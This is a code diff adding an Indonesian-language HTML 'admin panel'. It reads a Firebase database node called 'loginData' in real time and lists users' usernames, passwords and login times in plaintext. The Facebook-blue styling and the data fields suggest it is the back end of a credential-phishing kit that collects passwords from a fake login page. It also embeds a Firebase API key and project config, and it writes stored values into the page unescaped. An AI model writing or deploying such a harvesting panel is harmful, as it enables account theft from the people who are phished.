@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Panel – Data Login</title>
+
+<style>
+body {
+  background: #0f172a;
+  color: #fff;
+  font-family: Arial;
+  padding: 20px;
+}
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  margin-top: 20px;
+}
+
+th, td {
+  padding: 12px;
+  background: #1e293b;
+  border-bottom: 1px solid #334155;
+}
+
+th {
+  background: #1877F2;
+  color: #fff;
+  text-align: left;
+}
+
+td {
+  color: #E2E8F0;
+}
+</style>
+</head>
+<body>
+
+<h1>Admin Panel – Data Masuk User</h1>
+<p>Data di bawah tampil realtime dari Firebase.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Username</th>
+      <th>Password</th>
+      <th>Waktu</th>
+    </tr>
+  </thead>
+  <tbody id="tableData"></tbody>
+</table>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+import { getDatabase, ref, onValue }
+  from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDxgnLu6TtJce2hd1DL07z5MWo62blEgC8",
+  authDomain: "simulasi-kamera.firebaseapp.com",
+  databaseURL: "https://simulasi-kamera-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "simulasi-kamera",
+  storageBucket: "simulasi-kamera.firebasestorage.app",
+  messagingSenderId: "924924454534",
+  appId: "1:924924454534:web:8a3c34079aa1b0edd9d307"
+};
+
+const app  = initializeApp(firebaseConfig);
+const db   = getDatabase(app);
+
+onValue(ref(db, "loginData"), snap => {
+  const data = snap.val();
+  const table = document.getElementById("tableData");
+
+  table.innerHTML = "";
+
+  if(!data) return;
+
+  Object.values(data).forEach(item => {
+    table.innerHTML += `
+      <tr>
+        <td>${item.username}</td>
+        <td>${item.password}</td>
+        <td>${item.time}</td>
+      </tr>
+    `;
+  });
+});
+</script>
+
+</body>
+</html>
